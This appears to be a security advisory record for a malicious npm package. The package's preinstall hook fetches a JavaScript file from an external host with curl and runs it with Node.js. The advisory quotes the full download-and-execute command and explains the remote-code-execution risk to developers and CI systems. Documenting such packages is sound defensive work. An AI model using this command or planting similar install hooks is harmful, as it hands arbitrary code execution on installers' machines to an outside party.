summary: preinstall hook downloads and executes remote JavaScript from attacker-controlled host
details: On `npm install`, the package's preinstall lifecycle script runs `curl https://poc.amanrawat.com/hehe.js -o index.js && node index.js`, fetching arbitrary JavaScript from an external host and immediately executing it with Node.js on the installer's machine. The fetched content is unpinned (no hash, no signature, no version), served from a mutable third-party domain whose subdomain (`poc.`) and matching author handle (`amanrawat`) indicate proof-of-concept / attacker-controlled infrastructure rather than a legitimate vendor CDN. The package ships no documented library functionality — its sole on-install effect is to run whatever bytes are currently served at that URL. The package name (`sn-internal-testjgsakjdkjadkjah`) is a throwaway-style identifier consistent with a test or PoC publication to the public registry rather than a real library. Any developer or CI system installing this package grants the operator of poc.amanrawat.com arbitrary remote code execution under the installing user's credentials.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
